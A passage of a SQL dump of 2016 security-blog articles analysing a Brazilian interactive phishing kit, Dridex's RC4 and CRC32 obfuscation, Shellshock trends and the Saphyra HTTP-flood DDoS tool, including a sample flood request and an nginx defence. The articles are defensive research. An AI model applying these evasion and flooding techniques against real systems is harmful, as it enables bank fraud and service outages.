bank’s real website, but the URL in the address bar is not the correct one. To add a measure of credibility and to manage the different targeted brands, the attackers add an underscore followed by the bank’s URL in the address bar. The interactive web session begins as soon as a new victim arrives to the fake page. To alert the attacker every time there’s a new phish in the net, the admin panel launches a sound bite of evil laughter. Yes, evil laughter! From this point on, the victim and the attacker are interlocked in a conversation of sorts — only the victim is entirely unwitting and the criminal is likely to initiate an account takeover fraud attempt during the talk. \n Following the victim’s initial submission of login credentials, the criminal uses the admin panel to push social engineering screens to the victim, requesting other pieces of information the bank may require to complete a transaction. Using the admin panel (see Figure 2 below), the attacker can pick premade content or even type customized messages into the screen to make the process seem more personalized and legitimate. The admin panel itself is mostly written in Portuguese. Before the victim enters any more information, the panel indicates the status: waiting. \n \n Figure 3 shows how the panel enables the criminal to select messages from a menu. These are programmed to request different elements from the victim. Some examples are: \n \n On top of asking for these critical elements, the attacker can also return an error message if the victim enters incorrect information. The attacker can verify whether the information is correct by testing it on the bank’s site in real time. \n \n Victims are kept waiting online between new questions. The attacker displays a message asking the victim to wait a moment to draw out the live session. \n \n To keep switching up the requests displayed to the victim, the website renders new fields via JavaScript using AJAX, implemented by an external script, which is also written in Portuguese. This offers a hint to the kit’s origins: \n The following figure demonstrates conditions related to the fields rendered by the AJAX request. For example, once the phishing operator requests the password “senha” in Portuguese, the “senha” field will be displayed to the victim on the same screen they are looking at: The JavaScript code “document.getElemetById(“sen”)” acquires the relevant DIV element by the requested ID. By doing that, it sets the style of the DIV from “none” to “block” to render the content to the page. The next figure shows an example of the HTML chunk called for each question/screen change: After managing to obtain information from the victim, the attacker ends the sessions with a message about the “successful update” being complete. Notice the attacker ask the victim to wait 24 hours before accessing the site again. This is because the attacker wants the fraudulent transaction to clear before the victim discovers it.   do this by locking the access to the bank’s page. Interactive phishing uses social engineering throughout the process to achieve the same goals. \n \n The admin panel also indicates the completion of the attack on the cybercriminal’s end by modifying the status message to “finalizada,” which means “finalized”: \n \n To keep things in order following each attack completion, the panel logs the IP addresses of victims from whom details were stolen during the web session. Phishing is one of the oldest threats on the internet. This social engineering trick has been around since about 1995, per  . But although it really is one of the oldest tricks in the book, phishing attacks are still on the rise. The volume of phishing attacks surged 250 percent in Q1 2016, according to the Anti-Phishing Working Group’s “ .” That’s more phishing recorded this year than in any other three-month span since the group began tracking attack data in 2004. But phishing is also evolving. According to  , interactive man-in-the-middle (MitM) phishing is proof of increased sophistication, making attacks more believable through real-time data theft. Data stolen through interactive phishing can be commercialized in underground boards and sold to an untold number of cybercriminals. The commercialization factor amplifies the prevalence and risk of any online threat. The same kit can be adapted to target any bank in any country. Service providers must acknowledge this risk and mitigate it ahead of time. Since this sort of phishing attack can enable criminals to access victims’ accounts and defraud them with illicit transactions, one of the best ways to detect it is by using a  . Going beyond the use of technology, browsing hygiene rules are just as important to help users avoid even an advanced attack like interactive MitM phishing. Use these   to reduce risks, and check out the IBM X-Force Report “ ” for additional recommendations.', '\'Bank Fraud\', \'Brazil\', \'Fraud\', \'IBM X-Force Research\', \'Man-in-the-Middle (MitM) Attack\', \'Online Banking\', \'Phishing\', \'X-Force\'', 'https://securityintelligence.com/new-live-interactive-phishing-attacks-emerge-brazil/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (183, 'Pros and Cons of Building and Maintaining In-House Pen Testing Capability', 'Stiliyana Simeonova', '2016-9-30', 'Companies face many challenging questions when maturing their security programs, the answers of which are rarely straightforward. One of the most important decisions security leaders need to make is whether to build an in-house penetration testing capability. When it comes to the definition of  , it seems every company has its own. Most use it as a generalized term to describe any type of security audit or testing activity. Security professionals, however, would describe penetration testing as an exercise to evaluate particular attack scenarios with a specific, predefined outcome. They would also emphasize the clear difference between configuration review, vulnerability assessment, red teaming and penetration testing. For the sake of common perception, I will use the term pen testing to denote the entire set of technical assessment activities security leaders can leverage to achieve security assurance. When it comes to the cybercrime landscape, what was once perceived as a game of cat and mouse has grown into a full-fledged battle between security leaders and organized, sometimes state-sponsored, criminals. These criminals launch new attacks every day against increasingly complex IT infrastructures. This necessitates   for businesses of all sizes. Due to the growing demand for pen testing, many companies are considering bringing this capability in-house. Among the most obvious benefits of in-house pen testing is easier integration in the change management process. With more in-depth knowledge of the design and architecture of enterprise systems, an internal assessment team can suggest plausible attack scenarios. The pen testing team members could also be integrated as SMEs to advise on security requirements early in the system life cycle. Another benefit is shorter response time. Depending on the internal organizational structure and engagement process, in-house analysts can respond to requests for pen testing much faster than external testing providers. In-house pen testing also offers increased team focus and a higher level of coverage at a lower cost. An internal testing team could examine additional environments that an external team might not test due to cost concerns. Convenience always comes at a cost. An in-house security assessment team could come with a hefty price tag. It is great to have well-prepared technical people who know how to test the organization’s security controls in the most appropriate way. But keeping your army ready to act might require some budgetary gymnastics. The IT field is becoming more and more segmented, making it almost impossible to find well-rounded professionals who know electronics, networks, applications,   inside and out. An internal testing capability includes a team of people, each with their own specialization. Many of these professionals will be able to work outside their area of specialization, but they won’t be as effective as someone with that specific skill set. It is also important to consider redundancy, or how to remain operational while meeting testing demands in difference cases of absence. To keep your team current with the constantly evolving cyberthreat landscape, you will need to splurge for expensive trainings. In addition, new regulations require testing to be performed by accredited security professionals. Certifying your team will come at an additional cost. The shortage of skilled professionals in the cybersecurity field is well documented and sure to affect the industry for the foreseeable future. That means recruiters are likely after your most qualified and highly trained employees, bombarding them with tempting offers. It’s more important than ever for security leaders to maintain high levels of morale and motivation to keep the team together. Security professionals usually expect flexible work hours and locations, ample research time, extensive training, participation in conferences and more. Team leaders must know how to manage these expectations. Over the past 20 years, researchers and developers have endeavored to   as much as possible. Today, pen testing teams can leverage tools such as network scanners, dynamic and static code analysis tools, reverse engineering tool kits and more. Some tasks can be automated with open source and free tools, but commercial tools provide a level of efficiency security teams need to meet the growing demand for pen testing. When planning and implementing internal testing capabilities, organizations often overlook the infrastructure supporting the testing operations. Bear in mind that the testing team will need to collaborate and share highly sensitive data, and this information will need to be stored as evidence. Data retention is essential, and the server infrastructure should be able to support it. Organizations may consider adopting a hybrid model to balance the expense of building and maintaining a full-fledged security assessment team and the benefits of establishing internal testing capabilities. The most optimal solution may be to build an internal security assessment center and hire or train a limited number of security assurance specialists with intimate technical knowledge of your systems. This team should use hands-off resources to offer advice, outline a plan to meet a given testing objective, communicate with internal stakeholders and third-party providers to clarify the scope of the engagement, oversee the execution and relay the final results. Some organizations might decide to equip internal teams with a pool of hands-on resources with which to perform limited testing. In most cases, however, the actual hands-on job is outsourced to specialized service providers. \n To summarize, organizations stand to gain much by establishing in-house pen testing capabilities. Pros include: This convenience doesn’t come without a cost, however. Cons of in-house pen testing include: There are numerous incentives to establish an in-house pen testing team, most notably the cost-saving benefits. There are, however, many not-so-obvious considerations organizations tend to overlook that could render such a team ineffective. When considering in-house pen testing, security leaders should explore all the available options and reach out to   for advice.', '\'Penetration Testing\', \'Security Professionals\', \'Security Testing\'', 'https://securityintelligence.com/pros-cons-building-maintaining-house-pen-testing-capability/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (184, 'Protected API Calls and String Constants: Looting Dridex’s Candy Box', 'Magal Baz', '2016-9-29', 'When I was a kid, my mom would give my brothers and me a weekly allowance to buy candy. It was about the equivalent of $2, and if used prudently was just about enough to buy an ice cream bar and a few gummy bears. Some weeks, I’d go for packets of gum. On others, chocolate coins and so on. But no matter what my loot was, I had to face the challenge of keeping it hidden from my thieving brothers. Being the youngest brother, brute force and intimidation wasn’t an option, so I had to use stealth and clever tricks to keep my candy out of sight. Simple methods, such hiding it under the couch, were short lived, as my brothers had a keen nose for candy. I had to come up with more sophisticated hiding places, such as the bottom of a cereal box or beneath the vegetable tray, to overcome the rising challenge. There were moments when I grew tired of this endless race, but nowadays I can fully appreciate it as the perfect preparation for my work as a malware researcher. The only difference is that now I’m the one looking for the candy that malware authors do their best to hide, encrypt and disguise. That brings me to one interesting and familiar project: Dridex. This   plagues consumers and businesses all over the world, potentially grossing its cybergang billions of dollars a year. When it comes to hiding candy, Dridex goes to great lengths to hide some vital secrets regarding its malicious code — most notably the API calls and string constants it uses. Why are these such precious snacks? How are they being protected? How do we go about finding them? What’s changed in recent Dridex releases? Let’s have a look. It is well-known in security circles that financial malware most often comes in packed form. The binary within these packages is encrypted, thus seemingly inaccessible. With some packers, unpacking can be a real challenge. With others, it’s a simple matter of commanding them to unpack themselves, then extracting the code from memory. The latter case applies to most financial malware, including Dridex, making it fairly easy to unpack. Unfortunately, the parts of the code that are most valuable to researchers come with extra layers of obfuscation beyond the packing routine. Two of Dridex’s better protected soft spots are the API calls and its string constants. \n Here’s an example from the candy store, taken from Dridex build number 0x300c3/v3.195. Take a look at this code — can you tell what it does? Notice the calls to registers. These are calls to Windows API functions. As part of the obfuscation, the addresses are passed via registers, making it difficult to know which API functions are called by performing static analysis. Quite mysterious, isn’t it? Now look below at the same code with comments showing which API functions are being called: The purpose of this code is much clearer once we know what arguments this API functions receive. We can thus rename variables in the code to the following result: Much better now, isn’t it? But what about that mystery_function? Notice that it is called twice — once before each API call. We can see that it returns the address of the API function that will be called (on EAX) and that it receives an integer as a parameter (on EAX as well), in this case 0x17 and then 0x78. This function is an API resolver. Its job is to dynamically return the address of the API function that is to be used. It has to receive some index that dictates which API function it would resolve without making it easy for   to associate index with API function. For this reason, the names of API functions are kept encrypted. The resolver decrypts and returns the right function according to the index. With this information, we can now fully understand the code we inspected: Almost as important are Dridex’s string constants. Complex software, such as financial malware, uses many string constants, like file paths and registry keys. Dridex hides those as well, keeping them encrypted and only decrypting them right before they are used. Just like the resolve_api, there are functions responsible for decrypting strings according to a given index. Take a look at this code: Note that we added the comment, outlook_contact_list. That’s the string being resolved by resolve_string. We can get a good idea of what this string does just by looking at how it’s used in the function. Turns out, it’s accessing information about Outlook profiles on the infected endpoint. This code is likely part of Dridex’s capability to steal email information, which was added to the malware in late 2015, possibly to be used in business email compromise (BEC) fraud scenarios. Before the most recent   were released in 2016, those APIs and strings were protected by simple XOR encryption. They were kept in long tables in the binary’s PE .rdata section, with the XOR key appearing at the start of each table. The index given to the resolving function was, at the time, the actual index number of the string or API in the table, which the resolver would un-XOR and return. Dridex’s authors recently stepped up their API and string obfuscation game, replacing the basic XOR method with more challenging stealth methods. Let’s analyze them! Dridex’s previous obfuscation methods persisted for many months, so it was a notable change when a new build was released with different obfuscation methods. Per our analysis, the rest of the code didn’t change much, so we followed a usually useful rule: When trying to figure out what has changed, start by figuring out what hasn’t. Let’s take a piece of Dridex’s code where an API call is resolved and see what it looks like in the new build. In the old Dridex build (0x3003c), the code looked like this: This call to SetThreadPriority is very useful to us because it happens in one of the first instructions from DllEntryPoint, making it easy to locate in the code. When we go to a newer version and check out the code at DllEntryPoint, we see there has been a change: This figure above was taken from build 0x300f6/v3.246, as were the rest of the code examples from this point on. Most of the code seems the same. We can observe that mystery_function is the API-resolving function, but instead of the index, it now receives two DWORDs of unknown meaning. We also know that these DWORDs somehow stand for Kernel32!SetThreadPriority. We can thus name the code: Let’s get down to business and see how resolve_api_v2 works. We already know that when called with the arguments resolve_api_v2(0x2F3C3C34, 03A0ECF43), it returns the address of Kernel32!SetThreadPriority. Let’s analyze its code: Early on, resolve_api_v2 enters a loop that iterates over memory space, advancing in intervals of 0x10 bytes. Dynamically analyzing it with WinDBG, we set a break point at 0x6A9C78C4 (marked in red) and examined the data at the offset I named import_table: This is clearly some sort of import table. The 0x10-byte-long structures at the table present the following format: Notice the table is almost empty. It only stores information about API functions that were already called in the current execution so that they wouldn’t need to be resolved again each time. The more interesting bit is how resolve_api_v2 gets information about an API function when it is called for the first time and not yet stored in this table. The import table is not an ordinary one — it’s actually custom-made by Dridex’s developers. If the search in this custom import table fails, another internal function is called. Upon first glance, we can see several loops that perform XOR operations on running memory addresses — a decryption code. Without analyzing the entire function, we notice this small loop: Note the XOR with 0xEDB88320. This is a constant used for a CRC32 hashing operation. Let’s reload Dridex and put a break point at the start of the hashing process, then see what’s being hashed here. What we see are names of modules and their exports. Take, for example, the string “KERNEL32,” taken at a break point a bit further down the code: The hashes of this string are compared to the argument that the resolver function received. Turns out that the arguments resolve_api_v2 receives are CRC32 hashes with another XOR against a constant value. The first is the hash of the API function name and the other identifies the library of the API call. In our example: Going over and hashing the loaded modules and all their exports is quite a lot of work. Modules like kernel32 or ntdll have many exports, and having to hash them every time the code calls one of them is remarkably inefficient. That explains why Dridex developers use a custom import table to cache the ones already resolved. The first thing that comes to mind when examining Dridex’s new API obfuscation method is that it can’t be used to obfuscate the string constants. While the names of the modules and their exports are present in memory, there’s no pool of string constants to iterate over and hash to find the right one. The malware would have to hide them somewhere in the binary. Let’s have a look at a call to the resolving function: Similar to how we figured out the encrypted API calls, we will again observe that the code hasn’t changed much and locate a spot where it needs to resolve a string constant. We see that the code receives three parameters: an integer, which we shall soon see is an index; an offset in the binary’s .rdata section, where an encrypted blob is stored; and an output address. The encrypted blob has two parts — the first 40 bytes are the encryption key and the rest is the encrypted data. The resolver code is not very long in this case. We quickly located the point where the encrypted blob is being decrypted, which is done in a sequence of three loops: The   does two things: The   scrambles the permutation table: The   uses the permutation table to decrypt the data while continuously swapping the table: This looks an awful lot like RC4: A permutation table, S-Box, is initialized, scrambled with a key, then XORed against the data while continuously swapping values. Dridex regularly uses the RC4 cryptography to secure its communications with command-and-control servers, so it makes sense that it would use RC4 for internal string obfuscation as well. To save time and effort, let’s test this idea with an IDA Python script that performs RC4 decryption. The script I used here does a bit more — it also treats the decrypted data as a list of null terminated strings and returns a list: Success! As it turns out, Dridex does encrypt strings with the RC4 stream cipher. The decrypted data is a sequence of null terminated strings. The index that was given as an argument to the resolver is the index of the desired string in the sequence. We can now de-obfuscate both strings and API calls to create a readable sample of Dridex. It looks like Dridex’s developers decided to ditch the old XOR method and start protecting its secrets with more advanced encryption. Why change? Dridex is a constantly evolving project. As such, it moves forward with the times. Does this make the code more evasive and tougher to research? Perhaps temporarily — only until one figures out how the new protections work. Remember, the RC4 key is stored adjacent to the encrypted data, so decrypting is almost no problem at all. The CRC32 method used for the APIs is also simple once you know how it works. Dridex’s candy may have been moved to a different drawer, but we found it. Now we can research and develop protections against it more capably. In this research, I analyzed a Dridex sample with MD5: 010ed3da6a32c576bf60b6167dc3f136. Dridex is featured in an  , which is updated regularly.', '\'Advanced Threats\', \'Banking Trojan\', \'Dridex\', \'IBM X-Force Research\', \'Malware\', \'Threat Intelligence\', \'Trojan\', \'X-Force\'', 'https://securityintelligence.com/protected-api-calls-and-string-constants-looting-dridexs-candy-box/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (185, 'Automate Security Investigation and Remediation With External Threat Intelligence', 'Pamela Cobb', '2016-9-28', 'Imagine a battlefield in the Napoleonic War, the smell of gunpowder and anxious humanity rife in the air. It was in such circumstances that triage was invented to help address the overwhelming amount of work to sort and prioritize under pressure. Now imagine the ones and zeroes of data and   as the elements to be triaged rather than wounded soldiers. Security teams are overwhelmed by the combination of a flood of cybersecurity alerts and the lack of resources required to triage, investigate and mitigate these threats. This can result in major data breaches that can be damaging financially and even lead to executive management departures. Technology has improved, however, both in health care and cybersecurity. Incident triage now has the benefit of analytics and automation. A good security intelligence solution helps security teams identify threats in their environment. A good threat intelligence solution helps prioritize these threats within context of the external environment, and a good incident response solution streamlines the workflow to save time. A great security solution seamlessly wraps all three together to speed time to action and reduce overall risk to the organization. From within the  , a security analyst investigating an incident without an integrated threat intelligence solution has to move outside the platform. Whether that means searching the internet or digging through a different portal or database, it results in an interrupted workflow and compromises efficiency. With a solution like RiskIQ PassiveTotal, security analysts have direct access to that external context through IBM QRadar itself. This enables security teams to respond to incidents more efficiently and reduce the overall cybersecurity risk to the organization. \n  brings in internet infrastructure data, giving IP addresses in QRadar the full context of the internet by combining PassiveDNS, WHOIS, SSL certificates, web components, host pairs and RiskIQ’s proprietary data sets in real time. Four features were created to enable actionable threat intelligence from RiskIQ within QRadar: \n The PassiveTotal app for QRadar provides an integration that personalizes SIEM and allows for automated triage. RiskIQ helps eight of the 10 largest financial institutions in the U.S. and five of the nine leading internet companies in the world — including well-known social media and ride-sharing apps — respond to external threats. Along with these companies, customers of both QRadar and PassiveTotal can install the application by visiting the   from within their local QRadar instance and learn more from the  . You can learn more about the partnership between PassiveTotal and IBM QRadar by watching the on-demand webinar, “ .” .', '\'IBM Security App Exchange\', \'IBM Security QRadar\', \'Security Analytics\', \'Security Information and Event Management (SIEM)\', \'Threat Intelligence\'', 'https://securityintelligence.com/automate-security-investigation-remediation-external-threat-intelligence/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (186, 'Shellshock Anniversary: Major Security Flaw Still Going Strong', 'Michelle Alvarez', '2016-9-27', 'Ready for me to go old school? How about  -level old school? More than 13 years after it was first found scurrying around the internet, the SQL Slammer worm can still be found propagating in the wild, albeit minimally, according to   data. But why does such an old threat keep making the rounds more than a decade after its discovery? Some older threats never die because they’re easy to exploit. There’s always the chance that a vulnerable system can be compromised by tested and true bugs. While SQL Slammer is a dated threat that only affected Microsoft SQL server 2000, we have much more serious and widespread threats following in its footsteps. Last Saturday marked the two-year anniversary of one of the most infamous bugs of 2014, Shellshock. A recent   observed by IBM Managed Security Services suggested the threat is still prevalent. A 20-year-old vulnerability ( ) in the GNU Bash shell, which is widely used on Linux, Solaris and Mac OS systems, sparked the mobilization of attacks known as Shellshock beginning in late September 2014. This first vulnerability gave way to the disclosure of several additional vulnerabilities affecting the UNIX Shell within a short period (  and  ), at which point many realized that this was a threat to be reckoned with. Right at the onset, we observed a   in focused attacks leveraging these vulnerabilities — over 2,000 security events within 24 hours of the Shellshock bug disclosure. To get an idea of the magnitude of this activity, there were just over 7,500 Shellshock security events for the entire month of August 2016, according to IBM MSS data. When a zero-day vulnerability surfaces, especially a high-profile one that can affect many systems, the corresponding exploit is usually disclosed promptly. With Shellshock, an exploit targeting the first vulnerability was publicly disclosed a mere 28 hours after the zero-day vulnerability emerged. As news of this vulnerability and its ease of exploitation spread, the number of attackers opting to leverage and exploit it increased tremendously. Attacks came in waves from different source IPs and originating countries, rising in quantity every hour. As though in anticipation of its anniversary, Shellshock attack activity recently surged to levels not seen since 2015. As of Sept. 22, the month of September accounted for more than 26 percent of the total activity recorded in 2016. A little over 70 percent of the attack traffic originated in the U.S., whereas another 18 percent comes from Australia. Top targets of these attacks, according to IBM MSS data, include organizations located in U.S. (26 percent), Japan (18 percent), India (16 percent) and Brazil (11 percent). Before Shellshock had us scrambling to patch our systems in 2014, we were running for the hills because of another vulnerability.  , which affected OpenSSL, a popular open-source protocol, was  . Heartbleed enabled attackers to remotely exploit a vulnerability to read system memory contents without needing to log on and authenticate a valid identity to a remote server. Successful exploitation could allow attackers to retrieve private keys, passwords or other sensitive information from servers they were not authorized to access. Although a formidable threat when it first surfaced — IBM MSS data revealed over 1.8 million Heartbleed-based attacks by the end of the first month — Heartbleed failed to exhibit the same staying power as its system-crippling cousin, Shellshock. As shown in the figure above, in the past year, Heartbleed activity indeed paled in comparison to Shellshock, failing to reach even 15 percent of the total number of Shellshock attacks. Even as Shellshock attacks nosedived in November 2015 and continued to wane as we entered 2016, it still managed to maintain its stamina, averaging nearly 7,900 attacks per month throughout 2016. Per IBM MSS data, as of mid-September, the U.S. is the leading country from which Shellshock attacks originate, making up 71 percent of the total in 2016. Approximately 1,800 unique source IPs based in the U.S. were responsible for these attacks. China is in a distant second, making up 8 percent of the Shellshock attacks, followed by Australia and Italy at 6 percent and 3 percent, respectively. The U.S. is also the leading country in terms of organizations targeted by Shellshock, making up 46 percent of the total in 2016. Although Japan was at the top when the threat  , it ranks second in 2016, making up 24 percent of the total on a global scale. In terms of industries most targeted, the information and communication sector, including telecommunications companies as well as those that provide computer programming and consulting services, topped the list in 2016. They sustained over 46 percent of the Shellshock attacks. This makes sense since   in this space run Linux-based systems in their IT infrastructure and environments. Financial services ranked second at 26 percent, followed closely by manufacturing in third at 16 percent. The finance sector began adopting Linux-based platforms over  , with early adopters including the Chicago Mercantile Exchange in 2004 and the New York Stock Exchange in 2007. The pervasiveness of the operating system in this sector makes it an attractive target. UNIX systems, which employ the Bash shell, are also perhaps more prevalent in   versus other industries. ICS and SCADA hardware might also have a basic UNIX-like firmware running on the device that can’t be easily updated due to special constraints. That could lead to outdated vulnerable services such as SSH, OpenSSL and Apache running on critical devices. Additionally, the large discrepancy in Shellshock activity observed in information and communications, financial services and manufacturing versus other industries may point to differences in patching practices among those verticals. \n We wish we could wave a magic wand and make threats like Shellshock go away. But it’s not so simple, unfortunately. Like stains, some cyberthreats are persistently visible, and Shellshock seems bent on sticking around. So how do you address this issue? Apply the appropriate update for your system. Failure to apply patches and fixes leaves your organization at risk of Shellshock attacks. Timely patch management is vital in organizations of any size. However, depending on the complexity of your environment, this is easier said than done. Security intelligence and data analytics tools allow your organization to identify the greatest vulnerabilities and prioritize patching, keeping your systems patched and up to date.   can provide an additional layer of protection. While vendor patches are a first line of defense, protocol analysis, which is incorporated in IBM Security Network Intrusion Prevention product offerings, can provide an additional layer to protect against these types of attacks. In fact, IBM has been helping to protect customers from Shellshock and similar attacks  . Let’s hope this upward trend is fleeting, and next year there won’t be any reason to publish an anniversary blog. To learn more about other older attacks that are still successful, check out the IBM X-Force research paper, “ .”', '\'Data Protection\', \'Exploit\', \'Heartbleed\', \'Heartbleed OpenSSL Vulnerability\', \'Shellshock\', \'Vulnerability\'', 'https://securityintelligence.com/shellshock-anniversary-major-security-flaw-still-going-strong/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (187, 'Dissecting a Hacktivist’s DDoS Tool: Saphyra Revealed', 'Dave McMillen', '2016-9-23', 'Distributed denial-of-service (DDoS) attacks have been all over the news in recent months, with   taking major targets completely offline. According to IBM Managed Security Services data, the vast majority of DDoS attacks come in one of two flavors: SYN flood attacks, in which bad actors send multiple SYN requests to a victim’s webserver in an attempt to consume enough resources to render the system unresponsive, and UDP/DNS attacks on network layers 3 (network) and 4 (transport), also known as reflection attacks. We know, however, that attackers are constantly tweaking their techniques. With this in mind, we decided to take a look at a newer DDoS tactic. The tool in question, dubbed the  , targets network layer 7 (application) and results in an HTTP flood DDoS attack. This tool was responsible for taking down the NASA website earlier this year, according to  . Other modifications of this tool are called Sadattack, Thor and Hulk. An HTTP flood attack is a type of layer 7 application attack that utilizes the standard, valid GET/POST requests used to fetch information, as in typical URL data retrievals, during SSL sessions. An HTTP GET/POST flood is a volumetric attack that does not use malformed packets, spoofing or reflection techniques. The Saphyra iDDoS tool is a Python script that can be run on virtually any device, including mobile phones. Let’s take a look at this relatively simple script to understand how it operates and why it is hard to defend against. \n \n The script contains over 3,200 unique user agent strings and over 300 unique referrer field strings. This would allow for more than 1 million possible combinations of user agent string/referrer instances. When the tool is executed, a unique combination is sent in the form of HTTP requests to the victim’s website. Its main purpose is to generate unique requests, avoiding or bypassing caching engines and directly impacting the server load. This can   as the server becomes quickly overwhelmed by the volume of requests. The tool interface boasts an affiliation with almost 1.8 billion bots, but this could not be confirmed at the time of analysis. The Saphyra tool operates using a variety of techniques, including: \n Below is what the traffic looks like. Note the random GET request as well as user agent/referrer fields. GET /?Ch.Bg^=.r.J HTTP/1.1 \nAccept-Encoding: identity \nHost: victim.com \nKeep-Alive: 141 \nUser-Agent: Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US) \nAccept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7 \nConnection: close \nReferer: http://www.google.com/?q=~o~.Es..Te…y^F.j….wCB~Lta..`N}..FlJ.Mqom`..E.Qyn|.{GM.XhzN.Fx..C.P.G\\[r..VM…zoo.`..p..m. \nCache-Control: no-cache The figure below shows a small snapshot of traffic while executing the tool. We were able to generate over 7,500 individual connections per second against a test server in our lab. HTTP flood attacks are some of the most advanced nonvulnerability threats being perpetrated against web servers today. It is difficult for   endpoints to distinguish between legitimate and malicious web traffic. This could create a high number of false-positive alerts. Additionally, rate-based detection engines are incapable of detecting HTTP flood attacks when the traffic volume of HTTP floods is under detection thresholds. The Saphyra tool is designed to prevent server defenses from recognizing a pattern and filtering the attack traffic. There are, however, some tactics that can be deployed to both an IPS and to the web server itself. First, consider using a rewrite modification on NGINX. In /etc/nginx/conf.d/default.conf or similar, add the following inside the server block: The regex argument (.{1,})=(.{1,}) tells Nginx to redirect all GET requests that have any characters with = between them and redirect them to 444 (No Response). The example GET request below shows the equal sign that is common to all requests: GET /?uQQ[oKYF%7DH=TPTYKsO%257D%257E%255C HTTP/1.1 This tactic can be used on other web platforms as well. Consult your server documentation for instructions to create a rewrite mod. With some DDoS attacks, it’s difficult to determine what traffic is legitimate and what is malicious. The best defense is a comprehensive incident response plan, including failovers and a methodology for identifying, analyzing and neutralizing the threat. As a secondary tactic, consider a   that deflects and absorbs DDoS traffic before it reaches the target.', '\'Cybercriminals\', \'Distributed Denial-of-Service (DDoS) Attacks\', \'Hacking\', \'Hacktivism\'', 'https://securityintelligence.com/dissecting-hacktivists-ddos-tool-saphyra-revealed/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (188, 'Anonymous Unleashes Gold Medal DDoS Tools', 'Dave McMillen', '2016-9-21', 'The dust, waves and jubilation have settled on the sports festivities of this past summer. Since we’re in the business of cybersecurity, let’s reflect on one of the malicious activities that attempted to derail focus from this spirited event. Going into the games, many analysts expected the event to be   spanning multiple types of network attack vectors. A reported attack by cybercrime group Anonymous seems to have confirmed those fears. Perhaps the most concerning part of this attack is the   that enables bad actors to conduct distributed denial-of-service (DDoS) attacks. Are targeted tools the next big concern for those in charge of securing high-profile, global events? The first phase of the DDoS attacks primarily focused on several targets within  . According to  , the targets included the official websites of the Brazilian federal government, the state government of Rio de Janeiro, the Ministry of Sports and others. The second phase emphasized the retrieval of financial data and login credentials belonging to organizations such as the Brazilian Confederation of Modern Pentathlon, Brazilian Handball Confederation, Brazilian Confederation of Boxing and Brazilian Triathlon Confederation. According to research by  , Anonymous posted a spreadsheet of this information to its private Internet Relay Chat (IRC) channel, alongside hashed passwords corresponding to registered users of all these sites. Anonymous tweeted about its website takedown initiative and posted the results on its Facebook page. In the old days, users within the anonymous IRC channels had to use a tool called Low Orbit Ion Cannon (LOIC) to join coordinated DDoS attacks. The LOIC tool is connected to IRC in a way that enables remote control of its activity. Along with a capability called hivemind mode, computers equipped with LOIC can behave as part of a large botnet. That’s how IRC channel operators were able to quickly take down targeted websites. The LOIC tool’s unique capabilities also came with some interesting insights. For example, anyone could login to an Anonymous Operations channel to see how many bots were in the hive. This allowed channel operators to tout the level of strength they had for a DDoS attack when they threatened a victim. For their DDoS endeavors against the global sporting event, Anonymous operators took a different path. The group posted a link to another custom tool to its channel, which is part of the CyberGuerrilla IRC network, as well as on its Facebook and Twitter feeds. The tool runs on multiple Windows platforms backboned by Python. To enable participants to join the attacks, Anonymous included instructions on how to anonymize end user connections while performing DDoS attacks against predefined targets. Users accessed the channel to look for any updates to the target list before joining the DDoS attacks. Taking a deeper look at the tool, we found an executable file simply called ddos.exe, along with a library of Python-compiled bytecode files that allow for speedy execution. We also found several batch files that simply contained the target IPs of the intended victims. Although the tool itself contains a hardcoded list of targets, the list could be altered with a simple edit of the batch files. Once a target is selected and the attack is initiated, the tool spawns 9,000 individual attack instances and continues the DDoS until the participating Anonymous end user issues a “stop all” command. This tool also has built-in Tor capability. Unlike LOIC, Anonymous’ tool doesn’t report the volume of simultaneous attackers, making it impossible to tell how large the attack base is at any given time. Anonymous includes a warning in all its public communications and threats: “Expect Us.” Since Anonymous is capable of significant, large-scale attacks, threats from its operations center should be taken seriously. However, your   should be an ongoing activity, not based around one particular campaign. Organizations can proactively defend against DDoS attacks by staying on top of software updates and patches, implementing intrusion prevention systems (IPS), ensuring proper configuration of firewalls and access control lists, installing managed security solutions to stop DDoS traffic in its tracks and establishing a cohesive incident response plan. Test your protection and your team’s response capabilities by simulating DDoS attacks via stress tests. Regular attack simulations allow companies to measure reaction and protection levels within a controlled environment, understand the capacity of their resources and prepare a speedy recovery from an attempted takedown.', '\'Brazil\', \'Cybercrime\', \'Distributed Denial-of-Service (DDoS) Attacks\', \'X-Force\'', 'https://securityintelligence.com/anonymous-unleashes-gold-medal-ddos-tools/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (189, 'Meanwhile in Britain, Qadars v3 Hardens Evasion, Targets 18 UK Banks', 'Limor Kessem', '2016-9-20', 'IBM X-Force Research reported that the operators of the   have been progressively updating the malware’s defenses and tailoring its configurations to target 18 banks in the U.K. In addition to its recent U.K. activity, the researchers found that Qadars campaigns launched in early September 2016 mainly targeted banks in the Netherlands, U.S. and Germany. This activity comes on the heels of an uptick of   against U.K. banks. After a period of relatively low activity, during which cybercriminals shifted their focus to Germany, Brazil and the U.S., it seems the U.K. is back on fraudsters’ radar. From a global perspective, Qadars’ operators have been making the rounds, targeting banks all over the world in separate bouts of online banking fraud attacks since 2013. By count of targeted brands, it appears the gang remains most inclined to attack in Europe. Between 2013 and 2014, the malware mainly targeted banks in France and the Netherlands. Its top targets between 2015 and 2016 were Australia, Canada, the U.S. and the Netherlands. This past year, Qadars operators focused primarily on the Germany, Poland, the U.S. and the Netherlands.  indicated that while most of Qadars’ targets have been banks, it is also after social networking credentials, online sports betting users, e-commerce platforms, payments and card services, among others. Fueled by what appears to be experienced cybercrime factions, Qadars has been able to use advanced banking malware tactics ever since its early days, with capabilities such as: ATS is fraudster lingo for a remote, web-based platform that Trojans access on the fly. The ATS panel contains transaction automation scripts, webinjections, 